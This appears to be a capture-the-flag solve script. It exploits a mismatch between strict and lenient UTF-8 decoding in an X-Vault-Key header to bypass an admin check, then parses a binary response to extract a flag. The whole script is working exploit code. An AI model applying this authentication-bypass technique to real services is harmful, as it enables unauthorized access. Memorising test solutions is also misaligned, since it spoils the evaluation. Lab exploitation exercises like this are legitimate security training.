#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, struct, sys, zlib
from urllib.request import Request, urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# The X-Vault-Key header is base64-encoded. The server decodes it to bytes,
# then decodes as UTF-8. The filter uses strict decode (crashes on invalid bytes).
# The resolver uses errors='ignore' (strips invalid bytes).
# base64("admin\xff") = "YWRtaW4/"
key = base64.b64encode(b"admin\xff").decode()
req = Request(base + "/vault/admin", headers={"X-Vault-Key": key})
resp = urlopen(req, timeout=5)
data = resp.read()

# Binary struct: \x7fVLT + uint16 CRC + uint16 length + flag bytes
magic = data[:4]
if magic != b"\x7fVLT":
    raise SystemExit(f"bad magic: {magic!r}")
flag_len = struct.unpack(">H", data[6:8])[0]
flag = data[8:8 + flag_len].decode("utf-8")
print(flag)
PY
